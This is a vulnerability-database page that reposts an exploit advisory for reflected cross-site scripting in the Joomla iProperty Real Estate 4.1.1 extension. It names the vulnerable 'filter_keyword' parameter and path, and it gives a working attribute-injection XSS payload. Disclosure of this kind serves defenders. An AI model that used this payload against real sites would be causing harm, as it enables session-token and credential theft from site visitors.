---
title: Joomla iProperty Real Estate 4.1.1 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023070086
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-08-01
fetch_date: 2025-10-06T16:58:42.470254
---

# Joomla iProperty Real Estate 4.1.1 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Joomla iProperty Real Estate 4.1.1 Cross Site Scripting** **2023.07.31**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Joomla iProperty Real Estate 4.1.1 - Reflected XSS
# Exploit Author: CraCkEr
# Date: 29/07/2023
# Vendor: The Thinkery LLC
# Vendor Homepage: http://thethinkery.net
# Software Link: https://extensions.joomla.org/extension/vertical-markets/real-estate/iproperty/
# Demo: https://iproperty.thethinkery.net/
# Tested on: Windows 10 Pro
# Impact: Manipulate the content of the site
## Greetings
The\_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka
CryptoJob (Twitter) twitter.com/0x0CryptoJob
## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message
can perform a wide variety of actions, such as stealing the victim's session token or login credentials
Path: /iproperty/property-views/all-properties-with-map
GET parameter 'filter\_keyword' is vulnerable to XSS
https://website/iproperty/property-views/all-properties-with-map?filter\_keyword=[XSS]&option=com\_iproperty&view=allproperties&ipquicksearch=1
XSS Payload: pihil"onmouseover="alert(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"f63m4
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023070086)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top